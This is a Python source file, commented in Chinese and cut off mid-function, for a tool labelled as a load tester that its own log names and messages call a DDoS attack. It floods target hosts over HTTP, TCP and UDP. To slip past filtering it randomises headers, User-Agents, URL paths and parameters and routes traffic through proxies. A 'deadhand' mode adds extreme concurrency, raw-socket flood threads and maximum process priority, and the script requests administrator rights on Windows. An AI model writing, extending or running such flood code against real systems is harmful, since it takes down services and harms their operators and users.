import asyncio
import socket
import aiohttp
import threading
import random
from tqdm import tqdm
import platform
from colorama import Fore, init
import urllib.parse
import os
import json
import time
import signal
import string
import ssl
from datetime import datetime
import sys
import ctypes
import multiprocessing
import concurrent.futures
import psutil
import tkinter as tk
from tkinter import messagebox
import math
import gc  # 导入垃圾回收模块
import logging  # 导入日志模块

# 初始化日志系统
LOG_DIR = "logs"
if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)

# 设置日志格式和文件
log_file = os.path.join(LOG_DIR, f"ddos_test_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log")
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler(log_file),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("DDoS_TEST")

# 初始化颜色支持
init(autoreset=True)

# 检查是否有管理员权限并尝试获取
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

# if不是管理员权限else重新以管理员权限启动
if platform.system() == 'Windows' and not is_admin():
    logger.warning("未以管理员权限运行，尝试请求管理员权限...")
    print(Fore.YELLOW + "正在请求管理员权限以提高性能...")
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    sys.exit(0)

# 扩展流量混淆的 User-Agent 列表
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 Edg/92.0.902.55",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 OPR/78.0.4093.147",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/88.0",
    "Mozilla/5.0 (Android 11; Mobile; LG-M255; rv:88.0) Gecko/88.0 Firefox/88.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0",
    "Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 OPR/78.0.4093.147",
]

# 常见的请求头字段，用于混淆
COMMON_HEADERS = {
    "Accept": [
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "application/json,text/plain,*/*",
    ],
    "Accept-Language": [
        "en-US,en;q=0.9",
        "en-GB,en;q=0.9,en-US;q=0.8",
        "en-US,en;q=0.8,zh-CN;q=0.6,zh;q=0.4",
        "zh-CN,zh;q=0.9,en;q=0.8",
        "de-DE,de;q=0.9,en;q=0.8",
        "fr-FR,fr;q=0.9,en;q=0.8",
        "ja-JP,ja;q=0.9,en;q=0.8",
    ],
    "Accept-Encoding": [
        "gzip, deflate, br",
        "gzip, deflate",
        "br, gzip, deflate",
    ],
    "Cache-Control": [
        "max-age=0",
        "no-cache",
        "no-store, no-cache, must-revalidate",
    ],
    "Connection": [
        "keep-alive",
        "close",
    ],
    "DNT": ["1", "0"],
    "Upgrade-Insecure-Requests": ["1"],
    "Pragma": ["no-cache"],
    "Sec-Fetch-Dest": ["document", "empty", "image", "script", "style"],
    "Sec-Fetch-Mode": ["navigate", "cors", "no-cors", "same-origin"],
    "Sec-Fetch-Site": ["none", "same-origin", "cross-site", "same-site"],
    "Sec-Fetch-User": ["?1"],
}

# 常见URL路径和参数名，用于混淆
COMMON_PATH_SEGMENTS = [
    "api", "assets", "content", "images", "js", "css", "static", "media",
    "uploads", "files", "data", "resources", "public", "private", "admin",
    "login", "register", "user", "account", "profile", "settings", "dashboard",
    "blog", "news", "articles", "posts", "search", "about", "contact", "faq",
    "help", "support", "terms", "privacy", "legal", "store", "shop", "cart",
    "checkout", "products", "services", "categories", "tags", "index", "main",
    "home", "welcome", "default"
]

COMMON_PARAM_NAMES = [
    "id", "page", "limit", "offset", "q", "query", "search", "filter", "sort",
    "order", "direction", "start", "end", "from", "to", "date", "time", "timestamp",
    "token", "auth", "key", "api_key", "client_id", "user_id", "session",
    "category", "tag", "type", "format", "view", "mode", "action", "method",
    "callback", "jsonp", "lang", "locale", "country", "region", "timezone",
    "version", "v", "rev", "build", "platform", "device", "browser", "ref",
    "source", "campaign", "medium", "term", "content", "uid", "width", "height",
    "size", "quality", "color", "theme", "style", "layout", "template", "module",
    "component", "feature", "option", "setting", "config", "status", "state",
    "format", "fields", "include", "exclude", "expand", "collapse", "show", "hide"
]


class LoadTester:
    """负载测试工具（支持选择协议）Made by Brody-R."""

    def __init__(self, targets, request_size=1024, concurrency=100, timeout=30, protocol="http", proxies=None, duration=None, deadhand_mode=False):
        self.targets = targets
        self.request_size = request_size
        self.concurrency = concurrency
        self.timeout = timeout
        self.protocol = protocol
        self.proxies = proxies
        self.total_data_sent = 0
        self.should_stop = threading.Event()  # 使用线程事件替代布尔值
        self.start_time = None
        self.end_time = None
        self.successful_requests = 0
        self.failed_requests = 0
        self.progress_bars = {}
        self.main_progress = None
        self.duration = duration  # 攻击持续时间（秒）
        self.enable_random_delay = True  # 启用随机延迟
        self.min_delay = 0.005  # 最小延迟（秒），降低以提高吞吐量
        self.max_delay = 0.2  # 最大延迟（秒），降低以提高吞吐量
        self.enable_path_randomization = True  # 启用路径随机化
        self.enable_param_randomization = True  # 启用参数随机化
        self.tasks = []  # 存储所有任务的引用
        self.loop = None  # 存储事件循环引用
        self.cpu_count = multiprocessing.cpu_count()  # 获取CPU核心数
        self.network_monitor_thread = None  # 网络监控线程
        self.dynamic_concurrency = True  # 启用动态并发调整
        self.max_concurrency = concurrency * 2  # 最大并发连接数
        self.deadhand_mode = deadhand_mode  # 死手模式
        self.sockets = []  # 存储所有创建的套接字
        self.threads = []  # 存储所有创建的线程
        
        logger.info(f"初始化负载测试器: 目标={targets}, 协议={protocol}, 并发={concurrency}, 死手模式={deadhand_mode}")
        
        # 先导入math库供CPU密集计算使用
        if self.deadhand_mode:
            import math
        
        # 处理死手模式特殊设置
        if self.deadhand_mode:
            self.min_delay = 0  # 无延迟
            self.max_delay = 0.001  # 几乎无延迟
            self.max_concurrency = concurrency * 2000  # 极高的并发数
            self.request_size = max(request_size, 16384)  # 更大的请求大小
            # 启动CPU满载线程
            self._start_cpu_burnin_threads()

        # 优化CPU使用率设置
        if self.deadhand_mode:
            self.executor = concurrent.futures.ThreadPoolExecutor(
                max_workers=self.cpu_count * 200  # 死手模式下极大化线程数
            )
        else:
            self.executor = concurrent.futures.ThreadPoolExecutor(
                max_workers=min(32, self.cpu_count * 4)  # 根据CPU核心数动态设置
            )

        # 网络性能监控数据
        self.network_stats = {
            'last_bytes_sent': 0,
            'current_speed': 0,
            'peak_speed': 0,
            'speed_history': [],
        }

    def _start_cpu_burnin_threads(self):
        """启动网络攻击增强线程，确保攻击效果最大化"""
        print(Fore.RED + "启动网络攻击增强模块，最大化攻击效果...")
        
        # 提高进程优先级
        try:
            if platform.system() == 'Windows':
                # 设置为高优先级
                import psutil
                process = psutil.Process(os.getpid())
                process.nice(psutil.HIGH_PRIORITY_CLASS)
                
                # 提高网络相关线程的优先级
                print(Fore.RED + "提升网络线程优先级...")
            else:
                # Linux/MacOS设置为最高优先级(-20是最高)
                os.nice(-19)
            print(Fore.RED + "已将进程优先级提升至最高")
        except Exception as e:
            print(Fore.YELLOW + f"提升优先级警告: {str(e)}")
            
        # 预先准备攻击数据包以减少运行时负担
        self.attack_data_packets = []
        print(Fore.RED + "预生成攻击数据包...")
        for _ in range(10):
            if random.random() < 0.3:
                data = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(self.request_size))
            else:
                data = 'X' * self.request_size
            self.attack_data_packets.append(data.encode('utf-8'))
            
        # 启动额外的攻击线程
        self.extra_attack_threads = []
        
        # 创建辅助攻击函数，直接使用套接字进行更快的攻击
        def direct_socket_attack():
            """直接使用套接字发送数据，绕过更高层API的限制"""
            sockets = []
            targets = []
            
            # 解析目标
            for target in self.targets:
                parsed_url = urllib.parse.urlparse(target)
                host = parsed_url.hostname
                port = parsed_url.port if parsed_url.port else 80
                targets.append((host, port))
            
            # 创建多个连接
            for _ in range(50):  # 每个线程维护50个连接
                for host, port in targets:
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if self.protocol == "udp" else socket.SOCK_STREAM)
                        s.settimeout(1)  # 更短的超时
                        if self.protocol != "udp":
                            try:
                                s.connect((host, port))
                            except:
                                pass
                        sockets.append((s, (host, port)))
                    except:
                        pass
            
            # 持续发送数据包
            while not self.should_stop.is_set():
                for s, (host, port) in sockets:
                    try:
                        # 随机选择一个预生成的数据包
                        data = random.choice(self.attack_data_packets)
                        
                        # UDP和TCP使用不同的发送方法
                        if self.protocol == "udp":
                            try:
                                # 连续多次发送以增加攻击强度
                                for _ in range(10):  # 每次循环发送10个包
                                    s.sendto(data, (host, port))
                                    self.total_data_sent += len(data)
                                    self.successful_requests += 1
                            except:
                                # 忽略错误，继续攻击
                                pass
                        else:
                            try:
                                # 对TCP连接连续发送多次数据
                                for _ in range(5):  # 每次循环发送5个包
                                    s.send(data)
                                    self.total_data_sent += len(data)
                                    self.successful_requests += 1
                            except:
                                # 如果连接断开，尝试重新连接
                                try:
                                    s.close()
                                    new_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                    new_socket.settimeout(1)
                                    new_socket.connect((host, port))
                                    # 更新套接字引用
                                    sockets.remove((s, (host, port)))
                                    sockets.append((new_socket, (host, port)))
                                except:
                                    pass
                    except:
                        # 忽略所有错误，保持攻击持续进行
                        pass
        
        # 启动多个直接攻击线程
        attack_thread_count = self.cpu_count * 2  # 每个CPU核心2个线程
        print(Fore.RED + f"启动 {attack_thread_count} 个增强攻击线程...")
        
        for _ in range(attack_thread_count):
            thread = threading.Thread(target=direct_socket_attack)
            thread.daemon = True
            thread.start()
            self.extra_attack_threads.append(thread)
        
        # 启动优化内存使用的线程
        def memory_optimization():
            """定期检查和优化内存使用"""
            while not self.should_stop.is_set():
                try:
                    # 检查内存使用情况
                    memory_percent = psutil.virtual_memory().percent
                    if memory_percent > 85:
                        # 内存使用过高，执行垃圾回收
                        gc.collect()
                    time.sleep(5)  # 每5秒检查一次
                except:
                    pass
                
        memory_thread = threading.Thread(target=memory_optimization)
        memory_thread.daemon = True
        memory_thread.start()

    def _get_random_user_agent(self):
        return random.choice(USER_AGENTS)

    def _get_random_headers(self):
        """生成随机的HTTP请求头"""
        headers = {
            "User-Agent": self._get_random_user_agent()
        }

        # 添加随机的请求头字段
        for header, values in COMMON_HEADERS.items():
            if random.random() < 0.7:  # 70%的概率添加这个头
                headers[header] = random.choice(values)

        # 添加随机的自定义头 (X-开头)
        if random.random() < 0.3:
            custom_header_name = f"X-{self._generate_random_string(5, 15)}"
            headers[custom_header_name] = self._generate_random_string(5, 30)

        # 添加随机的日期头
        if random.random() < 0.2:
            headers["Date"] = datetime.now().strftime("%a, %d %b %Y %H:%M:%S GMT")

        # 添加随机的Cookie (有时候会有)
        if random.random() < 0.4:
            cookie_parts = []
            for _ in range(random.randint(1, 5)):
                cookie_name = self._generate_random_string(3, 10)
                cookie_value = self._generate_random_string(5, 20)
                cookie_parts.append(f"{cookie_name}={cookie_value}")
            headers["Cookie"] = "; ".join(cookie_parts)

        # 添加IE特有的头 (有时候会有)
        if random.random() < 0.1:
            headers["X-UA-Compatible"] = "IE=edge"

        return headers

    def _generate_random_string(self, min_length=5, max_length=10):
        """生成随机字符串"""
        length = random.randint(min_length, max_length)
        chars = string.ascii_letters + string.digits
        return ''.join(random.choice(chars) for _ in range(length))

    def _randomize_url(self, url):
        """对URL进行随机变化，添加随机路径和参数"""
        if not self.enable_path_randomization and not self.enable_param_randomization:
            return url

        parsed_url = urllib.parse.urlparse(url)
        path = parsed_url.path
        query = parsed_url.query

        # 随机添加路径段
        if self.enable_path_randomization and random.random() < 0.5:
            if path.endswith('/') or not path:
                path += random.choice(COMMON_PATH_SEGMENTS)
            else:
                path += '/' + random.choice(COMMON_PATH_SEGMENTS)

        # 解析现有的查询参数
        query_params = urllib.parse.parse_qs(query)

        # 随机添加查询参数
        if self.enable_param_randomization and random.random() < 0.6:
            for _ in range(random.randint(1, 3)):
                param_name = random.choice(COMMON_PARAM_NAMES)
                param_value = self._generate_random_string(3, 15)
                query_params[param_name] = [param_value]

        # 重建查询字符串
        new_query = urllib.parse.urlencode(query_params, doseq=True)

        # 重建URL
        randomized_url = urllib.parse.urlunparse((
            parsed_url.scheme,
            parsed_url.netloc,
            path,
            parsed_url.params,
            new_query,
            parsed_url.fragment
        ))

        return randomized_url

    async def _send_http_request(self, session, target):
        try:
            # 对目标URL进行随机化
            randomized_target = self._randomize_url(target)

            # 获取随机的请求头
            headers = self._get_random_headers()

            # 创建随机数据
            if random.random() < 0.3:  # 30% 概率使用随机数据而不是重复字符
                data = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(self.request_size))
            else:
                data = 'X' * self.request_size

            # 随机选择请求方法
            method = random.choice(['GET', 'POST'] if random.random() < 0.8 else ['GET', 'POST', 'PUT', 'DELETE'])

            # 延迟随机化，但保持较低以提高吞吐量
            if self.enable_random_delay:
                await asyncio.sleep(random.uniform(self.min_delay, self.max_delay))

            if method == 'GET':
                async with session.get(randomized_target, headers=headers, ssl=False, timeout=self.timeout) as resp:
                    await resp.read()
                    self.total_data_sent += len(str(headers))
                    self.successful_requests += 1
                    return True
            else:
                async with session.request(method, randomized_target, data=data, headers=headers, ssl=False, timeout=self.timeout) as resp:
                    await resp.read()
                    data_size = len(data) + len(str(headers))
                    self.total_data_sent += data_size
                    self.successful_requests += 1
                    return True
        except Exception as e:
            self.failed_requests += 1
            return False

    def _get_proxy_settings(self):
        """获取代理设置"""
        if not self.proxies:
            return None

        # 随机选择一个代理
        proxy = random.choice(self.proxies)
        return proxy

    def _sync_tcp_request(self, target):
        parsed_url = urllib.parse.urlparse(target)
        host = parsed_url.hostname
        port = parsed_url.port if parsed_url.port else 80
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                # 添加随机连接超时，死手模式下更短
                s.settimeout(random.uniform(0.5, 2) if self.deadhand_mode else random.uniform(1, self.timeout))

                # 尝试通过代理连接（如果有）
                proxy_used = False
                if self.proxies and random.random() < 0.9:  # 90% 概率使用代理
                    proxy = random.choice(self.proxies)
                    if proxy.startswith('socks'):
                        # 这里需要添加 socks 代理支持
                        # 为简单起见，如果需要 socks 代理，需要安装 PySocks
                        # 并修改为使用 socks.socksocket
                        pass

                s.connect((host, port))

                # 死手模式下发送更多数据
                if self.deadhand_mode:
                    # 使用预生成的数据包或生成新数据
                    if hasattr(self, 'attack_data_packets'):
                        data = random.choice(self.attack_data_packets)
                    else:
                        if random.random() < 0.3:
                            data = ''.join(random.choice(string.ascii_letters + string.digits) 
                                for _ in range(self.request_size)).encode('utf-8')
                        else:
                            data = (b'X' * self.request_size)
                    
                    # 连续发送多次数据
                    for _ in range(20):  # 增加发送次数
                        s.sendall(data)
                        self.total_data_sent += len(data)
                    
                    self.successful_requests += 1
                    return True
                else:
                    # 非死手模式下的原有逻辑
                    # 生成随机数据
                    if random.random() < 0.3:
                        data = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(self.request_size))
                    else:
                        data = 'X' * self.request_size

                    s.sendall(data.encode('utf-8'))
                    self.total_data_sent += len(data)
                    self.successful_requests += 1
                    return True
        except Exception as e:
            self.failed_requests += 1
            return False

    def _sync_udp_request(self, target):
        parsed_url = urllib.parse.urlparse(target)
        host = parsed_url.hostname
        port = parsed_url.port if parsed_url.port else 80

        try:
            # 解析主机名为IP
            ip = socket.gethostbyname(host)

            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                # 死手模式下发送更多数据
                if self.deadhand_mode:
                    # 生成或使用预生成的数据包
                    if hasattr(self, 'attack_data_packets'):
                        data = random.choice(self.attack_data_packets)
                    else:
                        if random.random() < 0.3:
                            data = ''.join(random.choice(string.ascii_letters + string.digits) 
                                for _ in range(self.request_size)).encode('utf-8')
                        else:
                            data = (b'X' * self.request_size)
                    
                    # 连续发送多个数据包以增加有效负载
                    for _ in range(50):  # 大幅增加每次发送的包数
                        s.sendto(data, (ip, port))
                        self.total_data_sent += len(data)
                    
                    self.successful_requests += 1
                    return True
                else:
                    # 非死手模式下的原有逻辑
                    # 生成随机数据包
                    if random.random() < 0.3:
                        data = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(self.request_size))
                    else:
                        data = 'X' * self.request_size

                    # 发送随机次数的数据包
                    packets = random.randint(1, 3) if random.random() < 0.2 else 1
                    for _ in range(packets):
                        s.sendto(data.encode('utf-8'), (ip, port))
                        self.total_data_sent += len(data)

                        # 随机延迟
                        if self.enable_random_delay and packets > 1:
                            time.sleep(random.uniform(self.min_delay, self.max_delay))

                    self.successful_requests += 1
                    return True
        except Exception as e:
            self.failed_requests += 1
            return False

    def _monitor_network_performance(self):
        """网络性能监控线程，动态调整并发"""
        network_io = psutil.net_io_counters()
        last_bytes_sent = network_io.bytes_sent
        last_time = time.time()

        while not self.should_stop.is_set():
            try:
                time.sleep(1)  # 每秒更新一次

                # 获取当前网络状态
                network_io = psutil.net_io_counters()
                current_time = time.time()

                # 计算当前速度
                bytes_sent_diff = network_io.bytes_sent - last_bytes_sent
                time_diff = current_time - last_time
                current_speed = bytes_sent_diff / time_diff if time_diff > 0 else 0

                # 更新历史记录
                self.network_stats['last_bytes_sent'] = network_io.bytes_sent
                self.network_stats['current_speed'] = current_speed
                self.network_stats['speed_history'].append(current_speed)
                if len(self.network_stats['speed_history']) > 10:
                    self.network_stats['speed_history'].pop(0)

                # 更新峰值速度
                if current_speed > self.network_stats['peak_speed']:
                    self.network_stats['peak_speed'] = current_speed

                # 动态调整并发
                if self.dynamic_concurrency:
                    # 如果速度下降，增加并发
                    avg_speed = sum(self.network_stats['speed_history']) / len(self.network_stats['speed_history']) if self.network_stats['speed_history'] else 0

                    # 简单的自适应算法
                    if current_speed < avg_speed * 0.8 and self.concurrency < self.max_concurrency:
                        new_concurrency = min(self.concurrency + 10, self.max_concurrency)
                        if new_concurrency != self.concurrency:
                            self.concurrency = new_concurrency
                            print(Fore.CYAN + f"\n[网络优化] 增加并发至 {self.concurrency} 以提高带宽利用")

                    # 如果CPU使用率过高，减少并发
                    if psutil.cpu_percent(interval=None) > 90:
                        new_concurrency = max(self.concurrency - 5, 10)
                        if new_concurrency != self.concurrency:
                            self.concurrency = new_concurrency
                            print(Fore.CYAN + f"\n[系统优化] 降低并发至 {self.concurrency} 以减轻CPU负担")

                last_bytes_sent = network_io.bytes_sent
                last_time = current_time

            except Exception as e:
                # 忽略监控错误，不影响主要功能
                pass

    async def _attack_http(self):
        # 使用自定义的SSL上下文
        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE

        # 设置连接器，优化连接池参数
        connector_kwargs = {
            "ssl": ssl_context,
            "verify_ssl": False,
            "limit": self.concurrency * 2,  # 增加连接池大小
            "limit_per_host": self.concurrency,  # 每个主机的连接限制
            "force_close": False,  # 保持连接打开
            "enable_cleanup_closed": True,  # 清理关闭的连接
        }

        # 获取代理设置
        proxy = self._get_proxy_settings()
        if proxy:
            connector_kwargs["proxy"] = proxy

        connector = aiohttp.TCPConnector(**connector_kwargs)

        # 创建更有效的超时设置
        timeout = aiohttp.ClientTimeout(
            total=self.timeout,
            connect=min(5, self.timeout/2),  # 降低连接超时以更快重试
            sock_connect=min(5, self.timeout/2),
            sock_read=self.timeout
        )

        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            # 为每个目标创建一个进度条
            self.progress_bars = {}
            for target in self.targets:
                self.progress_bars[target] = tqdm(
                    desc=f"{Fore.CYAN}HTTP {target[:30]}",
                    unit="req",
                    leave=True,
                    bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}, {rate_fmt}]"
                )

            # 创建一个总体进度条
            self.main_progress = tqdm(
                total=0,  # 动态更新
                desc=f"{Fore.YELLOW}总攻击进度",
                unit="req",
                leave=True,
                position=0,
                bar_format="{desc}: {n_fmt} 请求 | {elapsed} 已用时间 | {rate_fmt}"
            )

            tasks = []
            for target in self.targets:
                # 根据并发度动态创建worker
                for _ in range(self.concurrency):
                    task = asyncio.create_task(self._http_worker(session, target, self.progress_bars[target]))
                    tasks.append(task)
                    self.tasks.append(task)  # 存储任务引用

            try:
                await asyncio.gather(*tasks)
            except asyncio.CancelledError:
                pass
            finally:
                for pbar in self.progress_bars.values():
                    pbar.close()
                if self.main_progress:
                    self.main_progress.close()

    async def _http_worker(self, session, target, pbar):
        while not self.should_stop.is_set():  # 使用事件检查
            if await self._send_http_request(session, target):
                pbar.update(1)
                self.main_progress.update(1)
            # 死手模式下无延迟，增加并发
            if not self.deadhand_mode:
                await asyncio.sleep(0.001)  # 使用非常小的延迟，提高吞吐量

    async def _attack_tcp(self):
        # 为每个目标创建一个进度条
        self.progress_bars = {}
        for target in self.targets:
            self.progress_bars[target] = tqdm(
                desc=f"{Fore.CYAN}TCP {target[:30]}",
                unit="req",
                leave=True,
                bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}, {rate_fmt}]"
            )

        # 创建一个总体进度条
        self.main_progress = tqdm(
            total=0,  # 动态更新
            desc=f"{Fore.YELLOW}总攻击进度",
            unit="req",
            leave=True,
            position=0,
            bar_format="{desc}: {n_fmt} 请求 | {elapsed} 已用时间 | {rate_fmt}"
        )

        tasks = []
        for target in self.targets:
            # 根据并发度动态创建worker
            for _ in range(self.concurrency):
                task = asyncio.create_task(self._tcp_worker(target, self.progress_bars[target]))
                tasks.append(task)
                self.tasks.append(task)  # 存储任务引用

        try:
            await asyncio.gather(*tasks)
        except asyncio.CancelledError:
            pass
        finally:
            for pbar in self.progress_bars.values():
                pbar.close()
            if self.main_progress:
                self.main_progress.close()

    async def _tcp_worker(self, target, pbar):
        loop = asyncio.get_event_loop()
        while not self.should_stop.is_set():  # 使用事件检查
            result = await loop.run_in_executor(self.executor, self._sync_tcp_request, target)
            if result:
                pbar.update(1)
                self.main_progress.update(1)
            # 死手模式下无延迟
            if not self.deadhand_mode:
                await asyncio.sleep(0.001)  # 使用非常小的延迟，提高吞吐量

    async def _attack_udp(self):
        # 为每个目标创建一个进度条
        self.progress_bars = {}
        for target in self.targets:
            self.progress_bars[target] = tqdm(
                desc=f"{Fore.CYAN}UDP {target[:30]}",
                unit="req",
                leave=True,
                bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}, {rate_fmt}]"
            )

        # 创建一个总体进度条
        self.main_progress = tqdm(
            total=0,  # 动态更新
            desc=f"{Fore.YELLOW}总攻击进度",
            unit="req",
            leave=True,
            position=0,
            bar_format="{desc}: {n_fmt} 请求 | {elapsed} 已用时间 | {rate_fmt}"
        )

        tasks = []
        for target in self.targets:
            # 根据并发度动态创建worker
            for _ in range(self.concurrency):
                task = asyncio.create_task(self._udp_worker(target, self.progress_bars[target]))
                tasks.append(task)
                self.tasks.append(task)  # 存储任务引用

        try:
            await asyncio.gather(*tasks)
        except asyncio.CancelledError:
            pass
        finally:
            for pbar in self.progress_bars.values():
                pbar.close()
            if self.main_progress:
                self.main_progress.close()

    async def _udp_worker(self, target, pbar):
        loop = asyncio.get_event_loop()
        while not self.should_stop.is_set():  # 使用事件检查
            result = await loop.run_in_executor(self.executor, self._sync_udp_request, target)
            if result:
                pbar.update(1)
                self.main_progress.update(1)
            # 死手模式下无延迟
            if not self.deadhand_mode:
                await asyncio.sleep(0.001)  # 使用非常小的延迟，提高吞吐量

    def stop_attack(self):
        if self.should_stop.is_set():  # 防止重复停止
            return
            
        logger.info("正在停止攻击...")
        print(Fore.RED + "\n正在停止攻击，请稍等...")
        self.should_stop.set()  # 设置停止事件
        self.end_time = time.time()
        
        # 尝试取消所有任务
        if self.loop and self.tasks:
            for task in self.tasks:
                if not task.done():
                    task.cancel()
        
        # 确保UI更新
        if self.main_progress:
            self.main_progress.refresh()
            
        print(Fore.RED + "攻击被停止...")
        logger.info("攻击已停止")

    def _cleanup_resources(self):
        """清理所有资源，释放内存"""
        logger.info("开始清理资源...")
        print(Fore.YELLOW + "\n正在清理资源...")
        
        # 关闭所有套接字连接
        for sock in self.sockets:
            try:
                sock.close()
            except:
                pass
        self.sockets.clear()
        
        # 清空大型数据结构
        if hasattr(self, 'attack_data_packets'):
            self.attack_data_packets.clear()
        
        # 清空网络统计数据
        self.network_stats['speed_history'].clear()
        
        # 关闭线程池
        if hasattr(self, 'executor'):
            self.executor.shutdown(wait=False)
        
        # 强制垃圾回收
        gc.collect()
        
        # 显示内存使用情况
        memory_before = psutil.virtual_memory().percent
        
        # 再次强制垃圾回收
        gc.collect()
        gc.collect()
        
        memory_after = psutil.virtual_memory().percent
        logger.info(f"内存清理完成: {memory_before}% -> {memory_after}%")
        print(Fore.GREEN + f"内存清理完成: {memory_before}% -> {memory_after}%")

    def start(self):
        try:
            # 设置系统优化
            self._optimize_system()
            
            self.start_time = time.time()
            self.should_stop.clear()  # 重置停止事件
            self.loop = asyncio.new_event_loop()
            
            # 优化事件循环策略
            if hasattr(asyncio, 'WindowsSelectorEventLoopPolicy') and platform.system() == 'Windows':
                asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
                
            asyncio.set_event_loop(self.loop)

            # 设置信号处理
            if threading.current_thread() is threading.main_thread():
                # 直接设置停止函数而不是通过间接调用
                def signal_handler(sig, frame):
                    self.stop_attack()
                    
                if platform.system() != 'Windows':
                    self.loop.add_signal_handler(signal.SIGINT, self.stop_attack)
                else:
                    # Windows系统特定的信号处理
                    signal.signal(signal.SIGINT, signal_handler)

            if self.duration is not None:
                logger.info(f"攻击将在 {self.duration} 秒后自动停止")
                print(Fore.YELLOW + f"攻击将在 {self.duration} 秒后自动停止...")
            
            # 启动网络监控线程
            self.network_monitor_thread = threading.Thread(target=self._monitor_network_performance)
            self.network_monitor_thread.daemon = True
            self.network_monitor_thread.start()
            self.threads.append(self.network_monitor_thread)
                
            if self.protocol == "http":
                logger.info("开始HTTP攻击")
                self.loop.run_until_complete(self._attack_http())
            elif self.protocol == "tcp":
                logger.info("开始TCP攻击")
                self.loop.run_until_complete(self._attack_tcp())
            elif self.protocol == "udp":
                logger.info("开始UDP攻击")
                self.loop.run_until_complete(self._attack_udp())
            else:
                error_msg = f"不支持的协议: {self.protocol}"
                logger.error(error_msg)
                print(Fore.RED + error_msg)
        except KeyboardInterrupt:
            self.stop_attack()
            logger.info("用户中断攻击")
            print(Fore.RED + "\n用户中断攻击，正在停止...")
        except Exception as e:
            error_msg = f"攻击过程中发生错误: {str(e)}"
            logger.error(error_msg, exc_info=True)
            print(Fore.RED + error_msg)
        finally:
            # 取消所有任务并关闭事件循环
            try:
                if self.loop:
                    remaining_tasks = asyncio.all_tasks(self.loop)
                    if remaining_tasks:
                        for task in remaining_tasks:
                            task.cancel()
                        # 强制等待所有任务取消
                        self.loop.run_until_complete(asyncio.gather(*remaining_tasks, return_exceptions=True))
                    self.loop.close()
            except Exception as e:
                error_msg = f"清理过程中发生错误: {str(e)}"
                logger.error(error_msg, exc_info=True)
                print(Fore.RED + error_msg)
                
            # 关闭线程池
            self.executor.shutdown(wait=False)
            
            # 清理资源
            self._cleanup_resources()
                
            self.display_attack_statistics()
    
    def _optimize_system(self):
        """优化系统设置以提高网络性能"""
        try:
            print(Fore.GREEN + "正在优化系统设置以提高攻击效率...")
            
            # 提高套接字限制(仅限Linux/Mac)
            if platform.system() != 'Windows':
                # 尝试设置更高的文件描述符限制
                import resource
                soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
                try:
                    # 提高打开文件数限制
                    resource.setrlimit(resource.RLIMIT_NOFILE, (hard, hard))
                    print(Fore.GREEN + f"文件描述符限制已提高: {soft} -> {hard}")
                except Exception:
                    pass
            
            # Windows特定优化
            if platform.system() == 'Windows':
                # 检查是否有管理员权限
                if is_admin():
                    try:
                        # 可以在这里添加Windows特定的网络优化命令
                        # 例如调整TCP参数等
                        os.system('netsh int tcp set global autotuninglevel=normal')
                        # 移除不支持的chimney参数
